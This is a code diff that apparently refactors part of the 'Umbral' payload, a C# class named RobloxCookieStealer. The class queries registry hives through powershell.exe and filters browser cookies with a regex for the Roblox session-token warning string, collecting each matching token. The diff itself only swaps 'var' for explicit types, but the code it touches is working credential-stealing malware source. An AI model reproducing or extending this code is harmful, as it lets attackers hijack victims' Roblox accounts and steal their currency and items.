@@ -9,7 +9,7 @@ namespace Umbral.payload.Games.Roblox
 {
     internal static class RobloxCookieStealer
     {
-        private static readonly List<string> RobloxCookies;
+        static private readonly List<string> RobloxCookies;
 
         static RobloxCookieStealer()
         {
@@ -18,14 +18,14 @@ namespace Umbral.payload.Games.Roblox
 
         internal static async Task<string[]> GetCookies(params Task<CookieFormat[]>[] getBrowserCookiesTasks)
         {
-            var regex =
+            Regex regex =
                 new Regex(
                     @"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+",
                     RegexOptions.Compiled);
 
-            foreach (var key in new[] { "HKCU", "HKLN" })
+            foreach (string key in new[] { "HKCU", "HKLN" })
 
-                using (var process = new Process())
+                using (Process process = new Process())
                 {
                     process.StartInfo.FileName = "powershell.exe";
                     process.StartInfo.Arguments =
@@ -37,10 +37,10 @@ namespace Umbral.payload.Games.Roblox
                     process.WaitForExit();
                     if (process.ExitCode == 0)
                     {
-                        var matches = regex.Matches(await process.StandardOutput.ReadToEndAsync());
+                        MatchCollection matches = regex.Matches(await process.StandardOutput.ReadToEndAsync());
                         foreach (Match match in matches)
                         {
-                            var cookie = match.Value;
+                            string cookie = match.Value;
                             if (!RobloxCookies.Contains(cookie)) RobloxCookies.Add(cookie);
                         }
                     }
@@ -49,7 +49,7 @@ namespace Umbral.payload.Games.Roblox
             foreach (var getBrowserCookieTask in getBrowserCookiesTasks)
             {
                 var browserCookies = await getBrowserCookieTask;
-                foreach (var cookie in browserCookies
+                foreach (string cookie in browserCookies
                              .Where(p => regex.IsMatch(p.Cookie))
                              .Select(p => p.Cookie)
                              .ToArray()
